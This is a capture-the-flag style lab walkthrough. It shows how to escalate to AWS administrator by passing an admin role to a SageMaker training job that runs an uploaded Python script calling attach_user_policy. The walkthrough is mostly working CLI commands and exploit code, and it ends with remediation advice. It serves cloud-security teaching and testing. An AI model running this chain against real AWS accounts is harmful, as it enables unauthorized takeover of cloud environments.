# Guided Walkthrough: Privilege Escalation via iam:PassRole + sagemaker:CreateTrainingJob

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass an IAM role to SageMaker, create training jobs, and upload files to S3. The attacker can upload a malicious training script to S3, create a SageMaker training job that uses an administrative execution role, and have the training job execute the malicious code with admin privileges to grant the attacker administrative access.

SageMaker training jobs run containerized workloads with the permissions of their execution role. When a training job starts, it downloads the specified training script from S3 and executes it with the temporary credentials of the execution role. An attacker can exploit this by uploading a script that attaches admin policies to the starting user, creates access keys, or performs other privilege escalation actions — all from within the training container.

This attack is particularly powerful because SageMaker training jobs are designed to execute arbitrary code, making it a legitimate-looking avenue for privilege escalation. The technique was discovered by Spencer Gietzen from Rhino Security Labs in 2019 and remains an effective privilege escalation vector when users are granted SageMaker permissions alongside the ability to pass privileged roles.

## The Challenge

You start with credentials for `pl-prod-sagemaker-002-to-admin-starting-user`. This user has a narrow but dangerous permission set: `iam:PassRole` on `pl-prod-sagemaker-002-to-admin-passable-role`, `sagemaker:CreateTrainingJob`, `s3:PutObject`, and `s3:GetObject` on the training bucket. It cannot list IAM users, assume roles directly, or take any other privileged action.

Your goal is to gain effective administrator access — specifically, to have `AdministratorAccess` attached to your user so you can operate freely in the account.

## Reconnaissance

First, let's confirm who we are and what we can't do yet.

```bash
aws sts get-caller-identity
```

You'll see the ARN of `pl-prod-sagemaker-002-to-admin-starting-user`. Now try something that requires admin permissions:

```bash
aws iam list-users --max-items 1
```

This fails with an `AccessDenied` error — good. Now let's understand what we do have. Use your helpful permissions to discover the target role:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `sagemaker-002`)].{Name:RoleName,Arn:Arn}' --output table
```

You'll see `pl-prod-sagemaker-002-to-admin-passable-role`. Let's inspect it:

```bash
aws iam get-role --role-name pl-prod-sagemaker-002-to-admin-passable-role
```

The trust policy shows `"Service": "sagemaker.amazonaws.com"` — this role trusts the SageMaker service. Check its attached policies to confirm it has admin permissions:

```bash
aws iam list-attached-role-policies --role-name pl-prod-sagemaker-002-to-admin-passable-role
```

`AdministratorAccess` is attached. We have a passable admin role and the ability to create training jobs. This is the privilege escalation path.

Also check what S3 bucket exists for this scenario:

```bash
aws s3 ls | grep sagemaker-002
```

You'll see `pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}`.

## Exploitation

The plan: craft a Python script that attaches `AdministratorAccess` to our starting user, upload it to the S3 bucket, then create a SageMaker training job that passes the admin role and executes the script. SageMaker will run our script with full admin credentials.

### Step 1: Create the malicious training script

```bash
cat > /tmp/exploit.py << 'EOF'
#!/usr/bin/env python3
import boto3

print("Starting privilege escalation script...")

iam = boto3.client('iam')

iam.attach_user_policy(
    UserName='pl-prod-sagemaker-002-to-admin-starting-user',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
print("Successfully attached AdministratorAccess policy to pl-prod-sagemaker-002-to-admin-starting-user")
print("Privilege escalation complete!")
EOF
```

SageMaker training jobs expect code packaged as a `tar.gz` archive. The `sagemaker_program` hyperparameter tells SageMaker which file inside the archive to execute as the entry point.

```bash
cd /tmp && tar -czf sourcedir.tar.gz exploit.py && cd -
```

### Step 2: Upload the packaged script to S3

```bash
BUCKET_NAME="pl-prod-sagemaker-002-to-admin-bucket-$(aws sts get-caller-identity --query Account --output text)-<suffix>"

aws s3 cp /tmp/sourcedir.tar.gz s3://$BUCKET_NAME/sourcedir.tar.gz
```

The starting user's `s3:PutObject` permission allows this upload. Now the malicious script sits in the bucket, waiting to be fetched by a training job.

### Step 3: Create the SageMaker training job

This is the key step. We're using `iam:PassRole` to hand the admin role to SageMaker, then creating a training job that references our malicious script.

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
REGION="us-east-1"
PASSABLE_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-sagemaker-002-to-admin-passable-role"
CONTAINER_IMAGE="763104351884.dkr.ecr.${REGION}.amazonaws.com/pytorch-training:2.0.0-cpu-py310"
TRAINING_JOB_NAME="pl-demo-training-$(date +%s)"

aws sagemaker create-training-job \
    --region $REGION \
    --training-job-name $TRAINING_JOB_NAME \
    --role-arn $PASSABLE_ROLE_ARN \
    --algorithm-specification "{\"TrainingImage\": \"$CONTAINER_IMAGE\", \"TrainingInputMode\": \"File\"}" \
    --input-data-config "[{\"ChannelName\": \"training\", \"DataSource\": {\"S3DataSource\": {\"S3DataType\": \"S3Prefix\", \"S3Uri\": \"s3://$BUCKET_NAME\", \"S3DataDistributionType\": \"FullyReplicated\"}}}]" \
    --output-data-config "{\"S3OutputPath\": \"s3://$BUCKET_NAME/output\"}" \
    --resource-config "{\"InstanceType\": \"ml.m5.large\", \"InstanceCount\": 1, \"VolumeSizeInGB\": 10}" \
    --stopping-condition "{\"MaxRuntimeInSeconds\": 600}" \
    --hyper-parameters "{\"sagemaker_program\": \"exploit.py\", \"sagemaker_submit_directory\": \"s3://$BUCKET_NAME/sourcedir.tar.gz\"}"
```

SageMaker accepts the job. Behind the scenes it provisions an `ml.m5.large` instance, downloads the container image, fetches our `sourcedir.tar.gz` from S3, and runs `exploit.py` using the temporary credentials of `pl-prod-sagemaker-002-to-admin-passable-role`.

### Step 4: Wait for the training job to complete

Poll the status every 30 seconds. This typically takes 3-5 minutes.

```bash
while true; do
    STATUS=$(aws sagemaker describe-training-job \
        --region $REGION \
        --training-job-name $TRAINING_JOB_NAME \
        --query 'TrainingJobStatus' --output text)
    echo "[$(date +%H:%M:%S)] Status: $STATUS"
    [ "$STATUS" == "Completed" ] && break
    [ "$STATUS" == "Failed" ] && echo "Job failed!" && break
    sleep 30
done
```

When it reaches `Completed`, our script has run.

## Verification

Give IAM a moment to propagate the policy change, then verify:

```bash
sleep 15

aws iam list-attached-user-policies \
    --user-name pl-prod-sagemaker-002-to-admin-starting-user
```

You'll see `AdministratorAccess` in the output. Confirm you can now perform admin actions:

```bash
aws iam list-users --max-items 3 --output table
```

This succeeds. You have administrator access.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/sagemaker-002-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

The core of this attack is indirect code execution: we never had permission to call `iam:AttachUserPolicy` directly, but we had three permissions that together achieve the same outcome. `s3:PutObject` let us plant our payload, `iam:PassRole` let us designate the executor, and `sagemaker:CreateTrainingJob` fired the gun.

This is a pattern common across several AWS services (Lambda, EC2, ECS, CodeBuild, Glue) — wherever a user can pass a privileged role to a compute service and control what code that service runs. In real environments, this often arises when data science teams are granted SageMaker access without realizing that the `iam:PassRole` permission they've been given connects to a role far more powerful than what they need for legitimate ML workloads.

The fix is to treat `iam:PassRole` as a highly privileged action and always pair it with a strict `iam:PassedToService` condition — and, critically, to ensure that no roles passable to SageMaker carry permissions beyond what legitimate training jobs actually require.
